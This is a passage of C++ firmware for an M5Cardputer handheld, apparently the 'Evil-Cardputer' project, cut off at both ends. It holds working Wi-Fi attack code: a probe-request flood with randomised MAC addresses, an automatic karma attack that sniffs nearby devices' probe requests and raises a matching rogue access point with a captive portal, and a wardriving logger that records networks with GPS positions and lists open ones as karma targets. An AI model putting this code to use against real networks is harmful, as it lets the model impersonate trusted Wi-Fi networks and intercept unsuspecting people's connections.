      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !keyHandled) {
        Serial.println("SSID selected: " + probes[currentListIndex]);
        clonedSSID = probes[currentListIndex];
        waitAndReturnToMenu(probes[currentListIndex] + " selected");
        return; // Sortie de la fonction après sélection //here
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        break;
      }

      if (!M5Cardputer.Keyboard.isKeyPressed(';') && !M5Cardputer.Keyboard.isKeyPressed('.') && !M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        keyHandled = false;
      }
    }

    if (needDisplayUpdate) {
      M5.Display.clear();
      M5.Display.setTextSize(1.5);
      int y = 1; // Début de l'affichage en y

      for (int i = 0; i < maxDisplay; i++) {
        int probeIndex = (currentListIndex + i) % numProbes;
        if (i == 0) { // Mettre en évidence la sonde actuellement sélectionnée
          M5.Display.fillRect(0, y, M5.Display.width(), lineHeight, TFT_NAVY);
          M5.Display.setTextColor(TFT_GREEN);
        } else {
          M5.Display.setTextColor(TFT_WHITE);
        }
        M5.Display.setCursor(0, y);
        M5.Display.println(probes[probeIndex]);
        y += lineHeight;
      }
      M5.Display.display();
      needDisplayUpdate = false;
    }
  }
}



bool isProbePresent(String probes[], int numProbes, String probe) {
  for (int i = 0; i < numProbes; i++) {
    if (probes[i] == probe) {
      return true;
    }
  }
  return false;
}



void deleteProbe() {
  File file = SD.open("/probes.txt", FILE_READ);
  if (!file) {
    Serial.println("Failed to open probes.txt");
    waitAndReturnToMenu("Failed to open probes.txt");
    return;
  }

  String probes[MAX_SSIDS_Karma];
  int numProbes = 0;

  while (file.available() && numProbes < MAX_SSIDS_Karma) {
    String line = file.readStringUntil('\n');
    line.trim();
    if (line.length() > 0) {
      probes[numProbes++] = line;
    }
  }
  file.close();

  if (numProbes == 0) {
    waitAndReturnToMenu("No probes found");
    return;
  }

  const int lineHeight = 15;  // Adapté à l'écran de 128x128
  const int maxDisplay = 8;  // Calcul du nombre maximal de lignes affichables
  int currentListIndex = 0;
  bool needDisplayUpdate = true;
  bool keyHandled = false;

  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplémentaires
  enterDebounce();
  while (true) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(';') && !keyHandled) {
        currentListIndex = (currentListIndex - 1 + numProbes) % numProbes;
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
        keyHandled = true;
      } else if (M5Cardputer.Keyboard.isKeyPressed('.') && !keyHandled) {
        currentListIndex = (currentListIndex + 1) % numProbes;
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
        keyHandled = true;
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !keyHandled) {
        keyHandled = true;
        if (confirmPopup("Delete " + probes[currentListIndex] + " probe?")) {
          bool success = removeProbeFromFile("/probes.txt", probes[currentListIndex]);
          if (success) {
            Serial.println(probes[currentListIndex] + " deleted");
            waitAndReturnToMenu(probes[currentListIndex] + " deleted");
          } else {
            waitAndReturnToMenu("Error deleting probe");
          }
          return; // Exit after handling delete
        } else {
          waitAndReturnToMenu("Return to menu");
          return;
        }
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        break;
      }

      if (!M5Cardputer.Keyboard.isKeyPressed(';') && !M5Cardputer.Keyboard.isKeyPressed('.') && !M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        keyHandled = false;
      }
    }

    if (needDisplayUpdate) {
      M5.Display.clear();
      M5.Display.setTextSize(1.5);

      for (int i = 0; i < maxDisplay && i + currentListIndex < numProbes; i++) {
        int probeIndex = currentListIndex + i;
        String ssid = probes[probeIndex];
        ssid = ssid.substring(0, min(ssid.length(), (unsigned int)21));  // Tronquer pour l'affichage
        M5.Display.setCursor(0, i * lineHeight + 10);
        M5.Display.setTextColor(probeIndex == currentListIndex ? TFT_GREEN : TFT_WHITE);
        M5.Display.println(ssid);
      }

      M5.Display.display();
      needDisplayUpdate = false;
    }
  }
}



int showProbesAndSelect(String probes[], int numProbes) {
  const int lineHeight = 18;  // Adapté à l'écran de 128x128
  const int maxDisplay = (128 - 10) / lineHeight;  // Calcul du nombre maximal de lignes affichables
  int currentListIndex = 0;  // Index de l'élément actuel dans la liste
  int selectedIndex = -1;  // -1 signifie aucune sélection
  bool needDisplayUpdate = true;
  bool keyHandled = false;

  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplémentaires

  while (selectedIndex == -1) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(';') && !keyHandled) {
        currentListIndex = (currentListIndex - 1 + numProbes) % numProbes;
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
        keyHandled = true;
      } else if (M5Cardputer.Keyboard.isKeyPressed('.') && !keyHandled) {
        currentListIndex = (currentListIndex + 1) % numProbes;
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
        keyHandled = true;
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !keyHandled) {
        selectedIndex = currentListIndex;
        keyHandled = true;
        lastKeyPressTime = millis();
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        break;
      }

      if (!M5Cardputer.Keyboard.isKeyPressed(';') && !M5Cardputer.Keyboard.isKeyPressed('.') && !M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        keyHandled = false;
      }
    }

    if (needDisplayUpdate) {
      M5.Display.clear();
      M5.Display.setTextSize(1.5);

      for (int i = 0; i < maxDisplay && currentListIndex + i < numProbes; i++) {
        int displayIndex = currentListIndex + i;
        M5.Display.setCursor(10, i * lineHeight + 10);
        M5.Display.setTextColor(displayIndex == currentListIndex ? TFT_GREEN : TFT_WHITE);  // Highlight the current element
        M5.Display.println(probes[displayIndex]);
      }

      M5.Display.display();
      needDisplayUpdate = false;
    }
  }

  return selectedIndex;
}


bool removeProbeFromFile(const char* filepath, const String & probeToRemove) {
  File originalFile = SD.open(filepath, FILE_READ);
  if (!originalFile) {
    Serial.println("Failed to open the original file for reading");
    return false;
  }

  const char* tempFilePath = "/temp.txt";
  File tempFile = SD.open(tempFilePath, FILE_WRITE);
  if (!tempFile) {
    Serial.println("Failed to open the temp file for writing");
    originalFile.close();
    return false;
  }

  bool probeRemoved = false;
  while (originalFile.available()) {
    String line = originalFile.readStringUntil('\n');
    if (line.endsWith("\r")) {
      line = line.substring(0, line.length() - 1);
    }

    if (!probeRemoved && line == probeToRemove) {
      probeRemoved = true;
    } else {
      tempFile.println(line);
    }
  }

  originalFile.close();
  tempFile.close();

  SD.remove(filepath);
  SD.rename(tempFilePath, filepath);

  return probeRemoved;
}

void deleteAllProbes() {
  if (confirmPopup("Delete All Probes ?")) {
    File file = SD.open("/probes.txt", FILE_WRITE);
    if (file) {
      file.close();
      waitAndReturnToMenu("Deleted successfully");
      Serial.println("-------------------");
      Serial.println("Probes deleted successfully");
      Serial.println("-------------------");
    } else {
      waitAndReturnToMenu("Error..");
      Serial.println("-------------------");
      Serial.println("Error opening file for deletion");
      Serial.println("-------------------");
    }
  } else {
    waitAndReturnToMenu("Deletion cancelled");
  }
}

//KARMA-PART-FUNCTIONS-END


//probe attack


uint8_t originalMAC[6];

void saveOriginalMAC() {
  esp_wifi_get_mac(WIFI_IF_STA, originalMAC);
}

void restoreOriginalMAC() {
  esp_wifi_set_mac(WIFI_IF_STA, originalMAC);
}

String generateRandomSSID(int length) {
  const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  String randomString;
  for (int i = 0; i < length; i++) {
    int index = random(0, sizeof(charset) - 1);
    randomString += charset[index];
  }
  return randomString;
}

String generateRandomMAC() {
  uint8_t mac[6];
  for (int i = 0; i < 6; ++i) {
    mac[i] = random(0x00, 0xFF);
  }
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

void setRandomMAC_STA() {
  String mac = generateRandomMAC();
  uint8_t macArray[6];
  sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &macArray[0], &macArray[1], &macArray[2], &macArray[3], &macArray[4], &macArray[5]);
  esp_wifi_set_mac(WIFI_IF_STA, macArray);
  delay(50);
}



std::vector<String> readCustomProbes(const char* filename) {
  File file = SD.open(filename, FILE_READ);
  std::vector<String> customProbes;

  if (!file) {
    Serial.println("Failed to open file for reading");
    return customProbes;
  }

  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("CustomProbes=")) {
      String probesStr = line.substring(String("CustomProbes=").length());
      int idx = 0;
      while ((idx = probesStr.indexOf(',')) != -1) {
        customProbes.push_back(probesStr.substring(0, idx));
        probesStr = probesStr.substring(idx + 1);
      }
      if (probesStr.length() > 0) {
        customProbes.push_back(probesStr);
      }
      break;
    }
  }
  file.close();
  return customProbes;
}



int checkNb = 0;
bool useCustomProbes;
std::vector<String> customProbes;

void probeAttack() {
  WiFi.mode(WIFI_MODE_STA);
  isProbeAttackRunning = true;
  useCustomProbes = false;

  if (!isItSerialCommand) {
    useCustomProbes = confirmPopup("Use custom probes?");
    M5.Display.clear();
    if (useCustomProbes) {
      customProbes = readCustomProbes("/config/config.txt");
    } else {
      customProbes.clear();
    }
  } else {
    M5.Display.clear();
    isItSerialCommand = false;
    customProbes.clear();
  }
  int probeCount = 0;
  int delayTime = 500; // initial probes delay
  unsigned long previousMillis = 0;
  const int debounceDelay = 200;
  unsigned long lastDebounceTime = 0;

  M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
  M5.Display.setCursor(M5.Display.width() / 2 - 24, M5.Display.height() - 20);
  M5.Display.setTextColor(TFT_WHITE,TFT_RED);
  M5.Display.println("Stop");
  M5.Display.setTextColor(TFT_WHITE,TFT_BLACK);

  int probesTextX = 0;
  String probesText = "Probe Attack running...";
  M5.Display.setCursor(probesTextX, 37);
  M5.Display.println(probesText);
  probesText = "Probes sent: ";
  M5.Display.setCursor(probesTextX, 52);
  M5.Display.print(probesText);
  Serial.println("-------------------");
  Serial.println("Starting Probe Attack");
  Serial.println("-------------------");

  while (isProbeAttackRunning) {
    unsigned long currentMillis = millis();
    handleDnsRequestSerial();
    if (currentMillis - previousMillis >= delayTime) {
      previousMillis = currentMillis;
      setRandomMAC_STA();
      setNextWiFiChannel();
      String ssid;
      if (!customProbes.empty()) {
        ssid = customProbes[probeCount % customProbes.size()];
      } else {
        ssid = generateRandomSSID(32);
      }
      if (ledOn) {
        pixels.setPixelColor(0, pixels.Color(255, 0, 0));
        pixels.show();
        delay(50);

        pixels.setPixelColor(0, pixels.Color(0, 0, 0));
        pixels.show();
      }
      WiFi.begin(ssid.c_str(), "");

      M5.Display.setCursor(probesTextX + 12, 67); // Ajuster la position verticale
      M5.Display.fillRect(probesTextX +  12, 67, 40, 15, TFT_BLACK); // Ajuster la taille de la zone à remplir
      M5.Display.print(++probeCount);

      M5.Display.fillRect(100, M5.Display.height() / 2, 140, 20, TFT_BLACK);

      M5.Display.setCursor(100, M5.Display.height() / 2);
      // M5.Display.print("Delay: " + String(delayTime) + "ms");

      Serial.println("Probe sent: " + ssid);
    }

    M5.update();
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && currentMillis - lastDebounceTime > debounceDelay) {
      isProbeAttackRunning = false;
    }

  }
  Serial.println("-------------------");
  Serial.println("Stopping Probe Attack");
  Serial.println("-------------------");
  restoreOriginalWiFiSettings();
  useCustomProbes = false;
  inMenu = true;
  drawMenu();
}


int currentChannel = 1;
int originalChannel = 1;

void setNextWiFiChannel() {
  currentChannel++;
  if (currentChannel > 14) {
    currentChannel = 1;
  }
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}

void restoreOriginalWiFiSettings() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); // Petite pause pour s'assurer que tout est terminé
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  restoreOriginalMAC();
  WiFi.mode(WIFI_STA);
}


// probe attack end


// Auto karma
bool isAPDeploying = false;

void startAutoKarma() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); // Petite pause pour s'assurer que tout est terminé
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);

  isAutoKarmaActive = true;
  Serial.println("-------------------");
  Serial.println("Karma Auto Attack Started....");
  Serial.println("-------------------");

  readConfigFile("/config/config.txt");
  createCaptivePortal();
  WiFi.softAPdisconnect(true);
  loopAutoKarma();
  esp_wifi_set_promiscuous(false);
}


void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT || isAPDeploying) return;

  const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t *frame = packet->payload;
  const uint8_t frame_type = frame[0];

  if (frame_type == 0x40) {
    uint8_t ssid_length_Karma_Auto = frame[25];
    if (ssid_length_Karma_Auto >= 1 && ssid_length_Karma_Auto <= 32) {
      char tempSSID[33];
      memset(tempSSID, 0, sizeof(tempSSID));
      for (int i = 0; i < ssid_length_Karma_Auto; i++) {
        tempSSID[i] = (char)frame[26 + i];
      }
      tempSSID[ssid_length_Karma_Auto] = '\0';
      memset(lastSSID, 0, sizeof(lastSSID));
      strncpy(lastSSID, tempSSID, sizeof(lastSSID) - 1);
      newSSIDAvailable = true;
    }
  }
}



bool readConfigFile(const char* filename) {
  whitelist.clear();
  File configFile = SD.open(filename);
  if (!configFile) {
    Serial.println("Failed to open config file");
    return false;
  }

  while (configFile.available()) {
    String line = configFile.readStringUntil('\n');
    if (line.startsWith("KarmaAutoWhitelist=")) {
      int startIndex = line.indexOf('=') + 1;
      String ssidList = line.substring(startIndex);
      if (!ssidList.length()) {
        break;
      }
      int lastIndex = 0, nextIndex;
      while ((nextIndex = ssidList.indexOf(',', lastIndex)) != -1) {
        whitelist.push_back(ssidList.substring(lastIndex, nextIndex).c_str());
        lastIndex = nextIndex + 1;
      }
      whitelist.push_back(ssidList.substring(lastIndex).c_str());
    }
  }
  configFile.close();
  return true;
}

bool isSSIDWhitelisted(const char* ssid) {
  for (const auto& wssid : whitelist) {
    if (wssid == ssid) {
      return true;
    }
  }
  return false;
}


uint8_t originalMACKarma[6];

void saveOriginalMACKarma() {
  esp_wifi_get_mac(WIFI_IF_AP, originalMACKarma);
}

void restoreOriginalMACKarma() {
  esp_wifi_set_mac(WIFI_IF_AP, originalMACKarma);
}

String generateRandomMACKarma() {
  uint8_t mac[6];
  for (int i = 0; i < 6; ++i) {
    mac[i] = random(0x00, 0xFF);
  }
  // Force unicast byte
  mac[0] &= 0xFE;

  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

void setRandomMAC_APKarma() {

  esp_wifi_stop();

  wifi_mode_t currentMode;
  esp_wifi_get_mode(&currentMode);
  if (currentMode != WIFI_MODE_AP && currentMode != WIFI_MODE_APSTA) {
    esp_wifi_set_mode(WIFI_MODE_AP);
  }

  String macKarma = generateRandomMACKarma();
  uint8_t macArrayKarma[6];
  sscanf(macKarma.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &macArrayKarma[0], &macArrayKarma[1], &macArrayKarma[2], &macArrayKarma[3], &macArrayKarma[4], &macArrayKarma[5]);

  esp_err_t ret = esp_wifi_set_mac(WIFI_IF_AP, macArrayKarma);
  if (ret != ESP_OK) {
    Serial.print("Error setting MAC: ");
    Serial.println(ret);
    esp_wifi_set_mode(currentMode);
    return;
  }

  ret = esp_wifi_start();
  if (ret != ESP_OK) {
    Serial.print("Error starting WiFi: ");
    Serial.println(ret);
    esp_wifi_set_mode(currentMode);
    return;
  }
}



String getMACAddress() {
  uint8_t mac[6];
  esp_wifi_get_mac(WIFI_IF_AP, mac);
  char macStr[18];
  sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}


void loopAutoKarma() {
  while (isAutoKarmaActive) {
    M5.update(); M5Cardputer.update();

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      isAutoKarmaActive = false;
      isAPDeploying = false;
      isAutoKarmaActive = false;
      isInitialDisplayDone = false;
      inMenu = true;
      memset(lastSSID, 0, sizeof(lastSSID));
      memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
      newSSIDAvailable = false;
      esp_wifi_set_promiscuous(false);
      Serial.println("-------------------");
      Serial.println("Karma Auto Attack Stopped....");
      Serial.println("-------------------");
      break;
    }
    if (newSSIDAvailable) {
      newSSIDAvailable = false;
      activateAPForAutoKarma(lastSSID); // Activate the AP
      isWaitingForProbeDisplayed = false;
    } else {
      if (!isWaitingForProbeDisplayed || (millis() - lastProbeDisplayUpdate > 1000)) {
        displayWaitingForProbe();
        Serial.println("-------------------");
        Serial.println("Waiting for probe....");
        Serial.println("-------------------");
        isWaitingForProbeDisplayed = true;
      }
    }

    delay(100);
  }

  memset(lastSSID, 0, sizeof(lastSSID));
  newSSIDAvailable = false;
  isWaitingForProbeDisplayed = false;
  isInitialDisplayDone = false;
  inMenu = true;
  drawMenu();
}

void activateAPForAutoKarma(const char* ssid) {
  if (isSSIDWhitelisted(ssid)) {
    Serial.println("-------------------");
    Serial.println("SSID in the whitelist, skipping : " + String(ssid));
    Serial.println("-------------------");
    return;
  }
  if (strcmp(ssid, lastDeployedSSID) == 0) {
    Serial.println("-------------------");
    Serial.println("Skipping already deployed probe : " + String(lastDeployedSSID));
    Serial.println("-------------------");
    return;
  }

  isAPDeploying = true;
  isInitialDisplayDone = false;
  if (captivePortalPassword == "") {
    WiFi.softAP(ssid);
  } else {
    WiFi.softAP(ssid , captivePortalPassword.c_str());
  }
  DNSServer dnsServer;
  WebServer server(80);

  Serial.println("-------------------");
  Serial.println("Starting Karma AP for : " + String(ssid));
  Serial.println("Time :" + String(autoKarmaAPDuration / 1000) + " s" );
  Serial.println("-------------------");
  unsigned long startTime = millis();

  while (millis() - startTime < autoKarmaAPDuration) {
    displayAPStatus(ssid, startTime, autoKarmaAPDuration);
    dnsServer.processNextRequest();
    server.handleClient();

    M5.update(); M5Cardputer.update();

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
      break;
    }

    int clientCount = WiFi.softAPgetStationNum();
    if (clientCount > 0) {
      clonedSSID = String(ssid);
      isAPDeploying = false;
      isAutoKarmaActive = false;
      isInitialDisplayDone = false;
      Serial.println("-------------------");
      Serial.println("Karma Successful for : " + String(clonedSSID));
      Serial.println("-------------------");
      memset(lastSSID, 0, sizeof(lastSSID));
      newSSIDAvailable = false;
      M5.Display.clear();
      M5.Display.setCursor(0 , 32);
      M5.Display.println("Karma Successfull !!!");
      M5.Display.setCursor(0 , 48);
      M5.Display.println("On : " + clonedSSID);
      delay(7000);
      WiFi.softAPdisconnect(true);
      karmaSuccess = true;
      return;
    }

    delay(100);
  }
  strncpy(lastDeployedSSID, ssid, sizeof(lastDeployedSSID) - 1);

  WiFi.softAPdisconnect(true);
  isAPDeploying = false;
  isWaitingForProbeDisplayed = false;

  newSSIDAvailable = false;
  isInitialDisplayDone = false;
  Serial.println("-------------------");
  Serial.println("Karma Fail for : " + String(ssid));
  Serial.println("-------------------");
}


void displayWaitingForProbe() {
  M5.Display.setCursor(0, 0);
  if (!isWaitingForProbeDisplayed) {
    M5.Display.clear();
    M5.Display.setTextSize(1.5);
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 60, TFT_RED);
    M5.Display.setCursor(M5.Display.width() / 2 - 54, M5.Display.height() - 20);
    M5.Display.println("Stop Auto");
    M5.Display.setCursor(0, M5.Display.height() / 2 - 20);
    M5.Display.print("Waiting for probe");

    isWaitingForProbeDisplayed = true;
  }

  unsigned long currentTime = millis();
  if (currentTime - lastProbeDisplayUpdate > 1000) {
    lastProbeDisplayUpdate = currentTime;
    probeDisplayState = (probeDisplayState + 1) % 4;

    // Calculer la position X pour l'animation des points
    int textWidth = M5.Display.textWidth("Waiting for probe ");
    int x = textWidth;
    int y = M5.Display.height() / 2 - 20;

    // Effacer la zone derrière les points
    M5.Display.fillRect(x, y, M5.Display.textWidth("..."), M5.Display.fontHeight(), TFT_BLACK);

    M5.Display.setCursor(x, y);
    for (int i = 0; i < probeDisplayState; i++) {
      M5.Display.print(".");
    }
  }
}

void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPDuration) {
  unsigned long currentTime = millis();
  int remainingTime = autoKarmaAPDuration / 1000 - ((currentTime - startTime) / 1000);
  int clientCount = WiFi.softAPgetStationNum();
  M5.Display.setTextSize(1.5);
  M5.Display.setCursor(0, 0);
  if (!isInitialDisplayDone) {
    M5.Display.clear();
    M5.Display.setTextColor(TFT_WHITE);

    M5.Display.setCursor(0, 10);
    M5.Display.println(String(ssid));

    M5.Display.setCursor(0, 30);
    M5.Display.print("Left Time: ");
    M5.Display.setCursor(0, 50);
    M5.Display.print("Connected Client: ");
    // Affichage du bouton Stop
    M5.Display.setCursor(50, M5.Display.height() - 10);
    M5.Display.println("Stop");

    isInitialDisplayDone = true;
  }
  int timeValuePosX = M5.Display.textWidth("Left Time: ");
  int timeValuePosY = 30;
  M5.Display.fillRect(timeValuePosX, 20 , 25, 20, TFT_BLACK);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.setCursor(timeValuePosX, timeValuePosY);
  M5.Display.print(remainingTime);
  M5.Display.print(" s");

  int clientValuePosX = M5.Display.textWidth("Connected Client: ");
  int clientValuePosY = 50;
  M5.Display.fillRect(clientValuePosX, 40 , 25 , 20, TFT_BLACK);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.setCursor(clientValuePosX, clientValuePosY);
  M5.Display.print(clientCount);
}

//Auto karma end


String createPreHeader() {
  String preHeader = "WigleWifi-1.4";
  preHeader += ",appRelease=v1.2.9"; // Remplacez [version] par la version de votre application
  preHeader += ",model=Cardputer";
  preHeader += ",release=v1.2.9"; // Remplacez [release] par la version de l'OS de l'appareil
  preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de périphérique, si souhaité
  preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
  preHeader += ",board=M5Cardputer";
  preHeader += ",brand=M5Stack";
  return preHeader;
}

String createHeader() {
  return "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type";
}

int nearPrevousWifi = 0;
double lat = 0.0, lng = 0.0, alt = 0.0; // Déclaration des variables pour la latitude, la longitude et l'altitude
float accuracy = 0.0; // Déclaration de la variable pour la précision


void wardrivingMode() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  Serial.println("-------------------");
  Serial.println("Starting Wardriving");
  Serial.println("-------------------");
  M5.Lcd.fillScreen(TFT_BLACK);
  M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Lcd.setTextSize(1.5);
  M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
  M5.Display.setCursor(M5.Display.width() / 2 - 24 , M5.Display.height() - 20);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.println("Stop");
  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Lcd.setCursor(0, 10);
  M5.Lcd.printf("Scanning...");
  M5.Lcd.setCursor(0, 30);
  M5.Lcd.println("No GPS Data");

  delay(1000);
  if (!SD.exists("/wardriving")) {
    SD.mkdir("/wardriving");
  }

  File root = SD.open("/wardriving");
  int maxIndex = 0;
  while (true) {
    File entry = root.openNextFile();
    if (!entry) break;
    String name = entry.name();
    int startIndex = name.indexOf('-') + 1;
    int endIndex = name.indexOf('.');
    if (startIndex > 0 && endIndex > startIndex) {
      int fileIndex = name.substring(startIndex, endIndex).toInt();
      if (fileIndex > maxIndex) maxIndex = fileIndex;
    }
    entry.close();
  }
  root.close();

  bool exitWardriving = false;
  bool scanStarted = false;
  while (!exitWardriving) {
    M5.update(); M5Cardputer.update();
    handleDnsRequestSerial();

    if (!scanStarted) {
      WiFi.scanNetworks(true, true); // Start async scan
      scanStarted = true;
    }

    bool gpsDataAvailable = false;
    String gpsData;

    while (cardgps.available() > 0 && !gpsDataAvailable) {
      if (gps.encode(cardgps.read())) {
        if (gps.location.isValid() && gps.date.isValid() && gps.time.isValid()) {
          lat = gps.location.lat();
          lng = gps.location.lng();
          alt = gps.altitude.meters();
          accuracy = gps.hdop.value();
          gpsDataAvailable = true;
          // Affichage des informations GPS sur l'écran
          M5.Lcd.setCursor(0, 30);
          M5.Lcd.print("Longitude:");
          M5.Lcd.println(String(gps.location.lng(), 6));
          M5.Lcd.setCursor(0, 45);
          M5.Lcd.print("Latitude:");
          M5.Lcd.println(String(gps.location.lat(), 6));
          M5.Lcd.setCursor(0, 60);
          M5.Lcd.print("Sattelites:" + String(gps.satellites.value()));
          M5.Lcd.println("  ");

          // Altitude
          M5.Lcd.setCursor(0, 75);
          M5.Lcd.print("Altitude:");
          M5.Lcd.print(String(gps.altitude.meters(), 2) + "m");
          M5.Lcd.println("  ");

          // Date et Heure
          String dateTime = formatTimeFromGPS();
          M5.Lcd.setCursor(0, 90);
          M5.Lcd.print("Time:");
          M5.Lcd.print(dateTime);
          M5.Lcd.println("  ");
        }
      }
    }


    int n = WiFi.scanComplete();
    if (n > -1) {
      String currentTime = formatTimeFromGPS();
      String wifiData = "\n";
      for (int i = 0; i < n; ++i) {
        // Formater les données pour chaque SSID trouvé
        String line = WiFi.BSSIDstr(i) + "," + WiFi.SSID(i) + "," + getCapabilities(WiFi.encryptionType(i)) + ",";
        line += currentTime + ",";
        line += String(WiFi.channel(i)) + ",";
        line += String(WiFi.RSSI(i)) + ",";
        line += String(lat, 6) + "," + String(lng, 6) + ",";
        line += String(alt) + "," + String(accuracy) + ",";
        line += "WIFI";
        wifiData += line + "\n";
      }

      Serial.println("----------------------------------------------------");
      Serial.print("WiFi Networks: " + String(n));
      Serial.print(wifiData);
      Serial.println("----------------------------------------------------");

      String fileName = "/wardriving/wardriving-0" + String(maxIndex + 1) + ".csv";

      // Ouvrir le fichier en mode lecture pour vérifier s'il existe et sa taille
      File file = SD.open(fileName, FILE_READ);
      bool isNewFile = !file || file.size() == 0;
      if (file) {
        file.close();
      }

      // Ouvrir le fichier en mode écriture ou append
      file = SD.open(fileName, isNewFile ? FILE_WRITE : FILE_APPEND);

      if (file) {
        if (isNewFile) {
          // Écrire les en-têtes pour un nouveau fichier
          file.println(createPreHeader());
          file.println(createHeader());
        }
        file.print(wifiData);
        file.close();
      }

      scanStarted = false; // Reset for the next scan
      // Mettre à jour le nombre de WiFi à proximité sur l'écran
      M5.Lcd.setCursor(0, 10);
      M5.Lcd.printf("Near WiFi: %d\n", n);
    }

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) ) {
      exitWardriving = true;
      delay(1000);
      M5.Display.setTextSize(1.5);
      if (confirmPopup("List Open Networks?")) {
        M5.Lcd.fillScreen(TFT_BLACK);
        M5.Display.setCursor(0, M5.Display.height() / 2);
        M5.Display.println("Saving Open Networks");
        M5.Display.println("  Please wait...");
        createKarmaList(maxIndex);
      }
      waitAndReturnToMenu("Stopping Wardriving.");
      Serial.println("-------------------");
      Serial.println("Stopping Wardriving");
      Serial.println("-------------------");
    }
  }

  Serial.println("-------------------");
  Serial.println("Session Saved.");
  Serial.println("-------------------");
}


String getCapabilities(wifi_auth_mode_t encryptionType) {
  switch (encryptionType) {
    case WIFI_AUTH_OPEN: return "[OPEN][ESS]";
    case WIFI_AUTH_WEP: return "[WEP][ESS]";
    case WIFI_AUTH_WPA_PSK: return "[WPA-PSK][ESS]";
    case WIFI_AUTH_WPA2_PSK: return "[WPA2-PSK][ESS]";
    case WIFI_AUTH_WPA_WPA2_PSK: return "[WPA-WPA2-PSK][ESS]";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "[WPA2-ENTERPRISE][ESS]";
    default: return "[UNKNOWN]";
  }
}

String formatTimeFromGPS() {
  if (gps.time.isValid() && gps.date.isValid()) {
    char dateTime[30];
    sprintf(dateTime, "%04d-%02d-%02d %02d:%02d:%02d", gps.date.year(), gps.date.month(), gps.date.day(),
            gps.time.hour(), gps.time.minute(), gps.time.second());
    return String(dateTime);
  } else {
